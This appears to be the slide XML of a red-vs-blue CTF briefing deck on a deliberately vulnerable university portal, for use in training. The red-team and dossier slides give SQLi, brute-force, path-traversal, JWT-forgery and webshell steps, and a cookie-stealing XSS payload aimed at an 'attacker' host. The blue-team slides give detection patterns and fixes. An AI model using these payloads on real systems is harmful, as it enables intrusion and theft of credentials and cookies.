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14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828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743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57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4572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486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7315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10972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1887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2801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3716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4630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5544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6459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7373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288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9202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20116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21031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1945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3774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4688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5603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6517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7432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8346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9260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30175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31089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2004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2918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3832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4747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5661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6576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7490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38404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39319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40233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41148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2062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2976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3891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4805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45720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66344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75488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84632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493776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833872" y="0"/>
            <a:ext cx="36576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0" y="0"/>
            <a:ext cx="580644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0" y="36576"/>
            <a:ext cx="5806440" cy="18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27432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CLASSIFIED OPERATION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566928"/>
            <a:ext cx="1645920" cy="1828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858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2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="Text 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1115568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7200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="Text 65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2029968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4200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Shape 66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2743200"/>
            <a:ext cx="50292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57200" y="285292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Team vs Blue Team  ·  Cybersecurity Attack &amp; Defense  ·  Live Competition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3246120"/>
            <a:ext cx="1371600" cy="329184"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B1A1A"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="E74C3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" y="32461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RED TEAM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965960" y="3246120"/>
            <a:ext cx="1463040" cy="329184"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A3F6F"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00D4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65960" y="324612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BLUE TEAM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035040" y="2743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00D4FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MISSION SPECS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035040" y="548640"/>
            <a:ext cx="283464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35040" y="6583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035040" y="859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Vidyatech University Portal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6035040" y="1133856"/>
            <a:ext cx="283464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035040" y="13441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6035040" y="15453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Python Flask · SQLite · Docker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6035040" y="1819656"/>
            <a:ext cx="283464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35040" y="20299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VULNS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035040" y="22311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 Hidden Vulnerabilities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035040" y="2505456"/>
            <a:ext cx="283464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35040" y="27157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035040" y="29169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90 Minutes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035040" y="3191256"/>
            <a:ext cx="283464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035040" y="34015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035040" y="36027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2v2 Live Competition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6035040" y="3877056"/>
            <a:ext cx="2834640" cy="9144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035040" y="4087368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SCORING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035040" y="42885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150+ pts each team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NEXUS PROTOCOL  //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8288"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006680"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="006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6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Briefing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82296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41148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170432"/>
            <a:ext cx="475488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716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24128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 Overview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24128" y="1609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Mission format, objectives &amp; team roles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84832"/>
            <a:ext cx="41148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84832"/>
            <a:ext cx="475488" cy="80467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2860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24128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Technical Architecture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Frontend, Backend, Database &amp; Infrastructure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999232"/>
            <a:ext cx="41148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99232"/>
            <a:ext cx="475488" cy="80467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004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24128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 the Target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24128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Step-by-step system startup guide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41148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913632"/>
            <a:ext cx="475488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148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24128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Attack &amp; Defense Flow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4128" y="4352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Complete game flowchart for both teams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800600" y="1170432"/>
            <a:ext cx="41148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1170432"/>
            <a:ext cx="475488" cy="8046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13716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67528" y="1261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Red Team Playbook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67528" y="16093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Tools, attack chains &amp; exploit commands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084832"/>
            <a:ext cx="41148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084832"/>
            <a:ext cx="475488" cy="80467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2860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67528" y="2176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Blue Team Playbook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67528" y="25237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Detection tools, log analysis &amp; patch guide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00600" y="2999232"/>
            <a:ext cx="41148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2999232"/>
            <a:ext cx="475488" cy="80467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00600" y="32004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367528" y="30906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Vulnerability Dossier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67528" y="34381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All 10 vulns with payloads &amp; fixes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3913632"/>
            <a:ext cx="4114800" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22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00600" y="3913632"/>
            <a:ext cx="475488" cy="80467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11480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367528" y="4005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Scoring &amp; Win Conditions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67528" y="435254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Points system, rules &amp; time structure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//  OPERATION OVERVIEW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Nexus Protocol?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87552"/>
            <a:ext cx="8229600" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00668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87552"/>
            <a:ext cx="45720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42416"/>
            <a:ext cx="79552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</a:rPr>
              <a:t>A live cybersecurity attack &amp; defense event where two 2-person teams compete in real-time on a simulated university web portal. Red Team hunts and exploits hidden vulnerabilities. Blue Team detects attacks, defends systems, and patches code live. High-pressure, hands-on, real skills.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2651760" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22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755648"/>
            <a:ext cx="2651760" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B1A1A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55648"/>
            <a:ext cx="265176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7922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TEAM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6928" y="20482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74C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Offensive Operations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21792" y="2331720"/>
            <a:ext cx="73152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29514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Hunt and exploit all 10 vulnerabilities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" y="2807208"/>
            <a:ext cx="73152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7706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Bypass authentication systems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" y="3282696"/>
            <a:ext cx="73152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32461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Exfiltrate sensitive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" y="3758184"/>
            <a:ext cx="73152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37216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Upload webshells for RCE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1792" y="4233672"/>
            <a:ext cx="73152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41970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Earn flags — submit for points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91840" y="1755648"/>
            <a:ext cx="2651760" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22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1755648"/>
            <a:ext cx="2651760" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006680"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0066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1755648"/>
            <a:ext cx="265176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01568" y="17922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TEAM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01568" y="20482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D4FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Defensive Operations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456432" y="2331720"/>
            <a:ext cx="7315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3592" y="229514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Monitor the live attack dashboard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56432" y="2807208"/>
            <a:ext cx="7315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27706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Detect attacks via log analysis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56432" y="3282696"/>
            <a:ext cx="7315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93592" y="32461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Patch vulnerable code in real-time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456432" y="3758184"/>
            <a:ext cx="7315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93592" y="37216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Block attacker tools &amp; rate-limit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56432" y="4233672"/>
            <a:ext cx="73152" cy="7315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93592" y="41970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Write post-incident reports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26480" y="1755648"/>
            <a:ext cx="2651760" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22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26480" y="1755648"/>
            <a:ext cx="2651760" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="664800"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="6648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26480" y="1755648"/>
            <a:ext cx="265176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17922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JUDGES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36208" y="2048256"/>
            <a:ext cx="2432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B800"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Neutral Oversight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291072" y="2331720"/>
            <a:ext cx="73152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229514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Verify exploits are real &amp; working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291072" y="2807208"/>
            <a:ext cx="73152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277063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Award points to both teams fairly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91072" y="3282696"/>
            <a:ext cx="73152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324612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Access the instructor briefing page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91072" y="3758184"/>
            <a:ext cx="73152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28232" y="372160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Oversee the monitor dashboard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91072" y="4233672"/>
            <a:ext cx="73152" cy="7315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28232" y="41970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Announce winner at debrief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//  TECHNICAL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965960" cy="3858768"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22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1965960" cy="40233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33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21208" y="1481328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" y="15179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HTML5 + CSS3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76072" y="18105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Jinja2 templates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21208" y="2267712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23042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Google Fonts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" y="25968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Playfair Display + DM Sans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" y="3054096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0906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Vanilla JS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" y="33832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Built-in terminal widget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1208" y="3840480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8770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FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Responsive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6072" y="41696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Desktop-optimised design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96312" y="1005840"/>
            <a:ext cx="1965960" cy="3858768"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22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96312" y="1005840"/>
            <a:ext cx="1965960" cy="402336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1033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606040" y="1481328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9D4E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60904" y="15179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4EDD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Python 3.11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60904" y="18105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Core language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06040" y="2267712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9D4E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60904" y="23042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4EDD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Flask 3.0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60904" y="25968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Web framework + routing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606040" y="3054096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9D4E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60904" y="30906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4EDD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Jinja2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60904" y="33832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HTML templating engine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06040" y="3840480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9D4E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60904" y="38770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4EDD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Werkzeug 3.0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660904" y="41696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WSGI + dev server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581144" y="1005840"/>
            <a:ext cx="1965960" cy="3858768"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22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581144" y="1005840"/>
            <a:ext cx="1965960" cy="402336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1033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690872" y="1481328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00C4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45736" y="15179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69"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SQLite 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45736" y="18105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Embedded relational DB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690872" y="2267712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00C4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45736" y="23042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69"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5 Tables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745736" y="25968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students, staff, results, notices, orders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90872" y="3054096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00C4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45736" y="30906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69"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Raw SQL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745736" y="33832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Intentionally unsafe queries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690872" y="3840480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00C4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45736" y="38770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69"/>
                </a:solidFill>
              </a:rPr>
              <a:t>File path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745736" y="41696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data/vidyatech.db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665976" y="1005840"/>
            <a:ext cx="1965960" cy="3858768"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22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665976" y="1005840"/>
            <a:ext cx="1965960" cy="40233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65976" y="103327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775704" y="1481328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30568" y="151790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Docker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830568" y="1810512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Container deployment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6775704" y="2267712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0568" y="230428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Docker Compose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30568" y="2596896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Multi-service stack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775704" y="3054096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30568" y="30906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Port 5000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830568" y="338328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Main application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775704" y="3840480"/>
            <a:ext cx="1746504" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="21262D"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="FFB80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30568" y="387705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800"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Port 8080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6830568" y="4169664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</a:rPr>
              <a:t>Blue Team monitor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//  DEPLOY THE TARGET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the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0624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206240" cy="36576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A  //  PYTHON ONLY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316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No dependencies · Fastest setup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1591056"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667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6868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 archive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8680" y="177393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1773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unzip vidyatech-ctf.zip &amp;&amp; cd vidyatech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31136"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667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68680" y="2212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Install packages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241401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24140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 werkzeug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02920" y="2871216"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667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" y="28529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Launch app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8680" y="305409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0540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3511296"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667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6868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Open target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68680" y="369417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2688" y="36941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" y="4151376"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667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68680" y="41330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Launch monitor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68680" y="433425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43342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monitor/server.py  →  :8080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00600" y="1005840"/>
            <a:ext cx="4206240" cy="3931920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22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1005840"/>
            <a:ext cx="42062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1078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B  //  DOCKER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13167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</a:rPr>
              <a:t>Recommended · Full stack auto-start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7760" y="1591056"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 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303520" y="157276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Install Docker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303520" y="177393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67528" y="1773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docker.io docker-compose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937760" y="2231136"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 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03520" y="2212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Extract archive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03520" y="241401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67528" y="24140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unzip vidyatech-ctf.zip &amp;&amp; cd vidyatech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37760" y="2871216"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 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303520" y="28529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Set permissions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303520" y="305409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67528" y="30540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ctf.sh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937760" y="3511296"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 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937760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03520" y="3493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 all services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303520" y="369417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67528" y="369417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./ctf.sh start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937760" y="4151376"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667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37760" y="41513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303520" y="413308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Reset between runs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5303520" y="4334256"/>
            <a:ext cx="3566160" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12500"/>
            </a:avLst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67528" y="43342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./ctf.sh reset  (wipes DB + uploads)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65760" y="4754880"/>
            <a:ext cx="8412480" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14286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48640" y="4764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▸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261872" y="4764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http://localhost:5000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3337560" y="4764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▸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050792" y="4764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126480" y="47640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 ▸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839712" y="476402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/instructor/hints  PIN: VT@CTF2024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//  ATTACK &amp; DEFENSE FLOW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Game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1965960" cy="512064"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst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117"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Setup · 10 min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395728" y="1234440"/>
            <a:ext cx="164592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005840"/>
            <a:ext cx="1965960" cy="512064"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143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0241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14600" y="12618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117"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Recon · 10 min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98848" y="1234440"/>
            <a:ext cx="164592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005840"/>
            <a:ext cx="1965960" cy="512064"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 714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17720" y="10241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III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17720" y="12618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117"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Live Battle · 60 min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601968" y="1234440"/>
            <a:ext cx="164592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20840" y="1005840"/>
            <a:ext cx="1965960" cy="512064"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143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02412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IV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20840" y="1261872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117"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Debrief · 10 min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1609344"/>
            <a:ext cx="54864" cy="3108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162763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TEAM  //  ATTACK SEQUENCE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1938528"/>
            <a:ext cx="3749040" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B1A1A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195681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ENUMERATE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21305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Browse /robots.txt, /.env, view HTML source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48640" y="2377440"/>
            <a:ext cx="3749040" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B1A1A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3957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PROBE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56946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Test login forms for SQL injection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8640" y="2816352"/>
            <a:ext cx="3749040" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B1A1A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8346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EXPLOIT EASY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30083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Bypass auth, inject XSS, traverse directories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48640" y="3255264"/>
            <a:ext cx="3749040" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B1A1A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2735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ESCALATE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34472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Forge JWT tokens, IDOR, command injection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8640" y="3694176"/>
            <a:ext cx="3749040" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B1A1A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RCE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38862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Upload .php5 webshell via assignments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48640" y="4133088"/>
            <a:ext cx="3749040" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B1A1A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15137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EXFILTRATE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43251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Claim flags — submit to scoreboard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1609344"/>
            <a:ext cx="54864" cy="31089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16276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TEAM  //  DEFENSE SEQUENCE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00600" y="1938528"/>
            <a:ext cx="4069080" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A3F6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195681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MONITOR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21305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Open :8080 dashboard — watch incoming events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800600" y="2377440"/>
            <a:ext cx="4069080" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A3F6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239572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ANALYZE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892040" y="2569464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Check logs for SQLi, XSS, traversal patterns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00600" y="2816352"/>
            <a:ext cx="4069080" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A3F6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92040" y="2834640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PATCH CODE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92040" y="3008376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Parameterized queries, remove |safe filter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800600" y="3255264"/>
            <a:ext cx="4069080" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A3F6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327355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HARDEN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92040" y="3447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Change default creds, block /.env endpoint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800600" y="3694176"/>
            <a:ext cx="4069080" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A3F6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892040" y="3712464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RESTRICT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892040" y="3886200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Whitelist upload extensions, add MIME checks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00600" y="4133088"/>
            <a:ext cx="4069080" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A3F6F"/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92040" y="4151376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▶ DOCUMENT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92040" y="43251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D1D9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Write detailed incident report for bonus pts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370832" y="1828800"/>
            <a:ext cx="18288" cy="310896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06240" y="2834640"/>
            <a:ext cx="347472" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5263"/>
            </a:avLst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06240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//  RED TEAM PLAYBOOK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Offensive Toolkit &amp; Commands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4224528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69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sqlmap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078992"/>
            <a:ext cx="1005840" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13636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078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SQL Injection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426464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4630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sqlmap -u http://localhost:5000/login --data='roll_no=x&amp;password=x' --dbs --dump --batch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73168" y="1005840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C0392B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005840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005840"/>
            <a:ext cx="4224528" cy="3657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069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Hydra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82128" y="1078992"/>
            <a:ext cx="1005840" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1363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82128" y="1078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Brute Force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64608" y="1426464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4630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 -l FAC001 -P rockyou.txt http-post-form '/staff/login:emp_id=^USER^&amp;password=^PASS^:Invalid'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340864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340864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340864"/>
            <a:ext cx="4224528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404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Burp Suite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2414016"/>
            <a:ext cx="1005840" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13636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140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Intercept &amp; Modify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761488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79806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Proxy → Intercept ON → Modify roll_no field → Send to Repeater for SQLi &amp; XSS testing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73168" y="2340864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2A5F9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2340864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2340864"/>
            <a:ext cx="4224528" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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404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82128" y="2414016"/>
            <a:ext cx="1005840" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13636"/>
            </a:avLst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2128" y="24140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HTTP Exploitation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64608" y="2761488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79806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'http://localhost:5000/resources/download?file=../../etc/passwd'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3675888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675888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675888"/>
            <a:ext cx="4224528" cy="36576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739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jwt_tool / Python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474720" y="3749040"/>
            <a:ext cx="1005840" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13636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Token Forgery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096512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41330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python3 -c 'import base64,json; h=base64.urlsafe_b64encode(json.dumps({"alg":"none"}).encode()); ...'  →  empty signature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73168" y="3675888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73168" y="3675888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73168" y="3675888"/>
            <a:ext cx="4224528" cy="36576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2896" y="3739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Browser + DevTools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82128" y="3749040"/>
            <a:ext cx="1005840" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13636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Recon &amp; XSS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864608" y="4096512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41330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Ctrl+U → find HTML comments with credentials  |  Console: document.cookie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//  BLUE TEAM PLAYBOOK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Defensive Toolkit &amp; Response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4224528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69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Monitor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0" y="1078992"/>
            <a:ext cx="1005840" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13636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078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Live Detection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1426464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4630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  →  Auto-refresh every 4s. Alert on CRITICAL/HIGH events immediately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73168" y="1005840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2A5F9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73168" y="1005840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1005840"/>
            <a:ext cx="4224528" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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82896" y="10698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Wireshark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82128" y="1078992"/>
            <a:ext cx="1005840" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13636"/>
            </a:avLst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82128" y="10789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Packet Analysis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864608" y="1426464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14630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Filter: http.request.method == 'POST'  →  Inspect /login, /notices/post, /assignments/upload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2340864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340864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340864"/>
            <a:ext cx="4224528" cy="36576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2404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Browser DevTools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74720" y="2414016"/>
            <a:ext cx="1005840" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13636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4140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Patch Verify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" y="2761488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79806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F12 → Network tab → after each patch, re-test the attack → confirm 403 or safe response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773168" y="2340864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73168" y="2340864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2340864"/>
            <a:ext cx="4224528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24048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SQLite3 / Flask Shell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82128" y="2414016"/>
            <a:ext cx="1005840" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13636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82128" y="24140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DB Hardening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864608" y="2761488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2798064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sqlite3 data/vidyatech.db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UPDATE staff SET password='N3xusStr0ng!' WHERE emp_id='FAC001';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65760" y="3675888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675888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3675888"/>
            <a:ext cx="4224528" cy="36576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739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grep / tail -f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474720" y="3749040"/>
            <a:ext cx="1005840" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13636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74720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Log Watch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57200" y="4096512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12064" y="41330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tail -f /tmp/vidyatech_access.log | grep -iE "OR|script|\.\.|\.php5|alg.*none"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773168" y="3675888"/>
            <a:ext cx="4224528" cy="1225296"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22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73168" y="3675888"/>
            <a:ext cx="4224528" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="21262D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73168" y="3675888"/>
            <a:ext cx="4224528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82896" y="3739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Text Editor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882128" y="3749040"/>
            <a:ext cx="1005840" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13636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3749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117"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Code Patches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864608" y="4096512"/>
            <a:ext cx="4041648" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5556"/>
            </a:avLst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19472" y="413308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→ parameterized queries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templates/base.html → remove | safe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 → shell=False, os.path.basename()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//  VULNERABILITY DOSSIER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2608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91256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9544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VT{sql_inj3ction_login_bypass}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92608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SQL Injection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EASY · +10 pts · POST /login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Student login page — Roll Number field is injectable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914400"/>
            <a:ext cx="4572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Query built via Python f-string: f"SELECT * FROM students WHERE roll_no='{roll}' AND password='{pwd}'". No parameterization.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914400"/>
            <a:ext cx="45720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Roll No: ' OR '1'='1'--  Password: anything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sqlmap -u http://localhost:5000/login --data='roll_no=x&amp;password=x' --dbs --dump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048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db.execute("SELECT * FROM students WHERE roll_no=? AND password=?", (roll, pwd))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all f-string SQL with ? parameterized queries.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28032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VT{stored_xss_n0tice_b0ard}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828032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0096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Stored XSS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EASY · +10 pts · POST /notices/post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9472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Notice board — content field stored raw, rendered unsanitized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28032" y="914400"/>
            <a:ext cx="45720" cy="65836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19472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notices.html renders: {{ n.content | safe }} — the Jinja2 |safe filter disables auto-escaping. Any JS in content executes for every visitor.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28032" y="914400"/>
            <a:ext cx="45720" cy="89611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9472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&lt;script&gt;alert(document.cookie)&lt;/script&gt;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&lt;script&gt;fetch('http://attacker/steal?c='+document.cookie)&lt;/script&gt;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28032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919472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| safe filter from notices.html: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n.content }}   ← Jinja2 escapes HTML by default without |safe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//  VULNERABILITY DOSSIER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2608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91256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9544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VT{d3fault_cr3ds_staff_portal}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92608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Default Credentials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EASY · +10 pts · POST /staff/login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Staff portal — admin account never changed from initial password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914400"/>
            <a:ext cx="45720" cy="658368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Account FAC001 (role=admin) created with password admin123. No forced change, no lockout policy, no complexity requirement.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914400"/>
            <a:ext cx="45720" cy="89611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 ID: FAC001   Password: admin123</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pP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hydra -l FAC001 -P rockyou.txt http-post-form '/staff/login:emp_id=^USER^&amp;password=^PASS^:Invalid'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048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 password change on first login.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staff SET password='N3xusStr0ng@2024!' WHERE emp_id='FAC001';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Add: account lockout after 5 failed attempts.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28032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VT{dir_trav3rsal_file_l3ak}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828032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0096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Directory Traversal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EASY · +10 pts · GET /resources/download?file=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9472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Resources page — file download parameter accepts any path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28032" y="914400"/>
            <a:ext cx="45720" cy="65836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19472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filepath = os.path.join('static/files', filename) — no sanitisation. The ?file= param can traverse with ../../ sequences to any readable file.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28032" y="914400"/>
